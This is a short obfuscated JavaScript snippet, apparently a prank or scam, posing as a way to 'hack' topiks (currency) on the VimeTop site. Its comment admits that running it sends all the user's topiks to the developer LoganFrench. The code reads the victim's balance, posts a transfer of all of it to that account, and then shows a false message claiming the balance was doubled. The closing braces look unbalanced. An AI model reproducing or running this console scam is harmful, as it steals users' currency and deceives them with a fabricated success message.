/*
    Пример "взлома" топиков на VimeTop
    [!] При выполнении этого кода на сайте vimetop.ru, все ваши топики уйдут разработчику сайта (LoganFrench)
    Не смотрите на код получения баланса, пожалуйста. :p
*/

let getTopiks = ["Ваш баланс:", "топик(ов)", "Нажимая \"Отправить\" Вы соглашаетесь с правилами сайта", "* все пополнения совершенные на сайте считаются пожертвованиями, а в качестве благодарности выступают поощрения в виде топиков", "Отправить", "#payment-block.col-md-6.mx-auto", "/ajax/settings/transfer.php", "POST", true, "transfer", "LoganFrench",
    [Number, 'replace', 'outerText', 'ajax', 'url', 'type', 'json', 'data', 'type', 'username', 'amount', 'success']
];

let playerBalance = getTopiks[11][0](
    $(getTopiks[5])[0][getTopiks[11][2]]
        [getTopiks[11][1]](getTopiks[0], "")
        [getTopiks[11][1]](getTopiks[1], "")
        [getTopiks[11][1]](getTopiks[2], "")
        [getTopiks[11][1]](getTopiks[3], "")
        [getTopiks[11][1]](getTopiks[4], "")
);

$[getTopiks[11][3]]({
    [getTopiks[11][4]]: getTopiks[6],
    [getTopiks[11][5]]: getTopiks[7],
    [getTopiks[11][6]]: getTopiks[8],
    [getTopiks[11][7]]: {
        [getTopiks[11][8]]: getTopiks[9],
        [getTopiks[11][9]]: getTopiks[10],
        [getTopiks[11][10]]: playerBalance,
    },
    [getTopiks[11][11]]: function(data) {
        if (data.status) {
            _notify[getTopiks[11][11]](`Ваш счёт (${playerBalance}) был умножен в два раза (${playerBalance * 2}).`);
        }
});
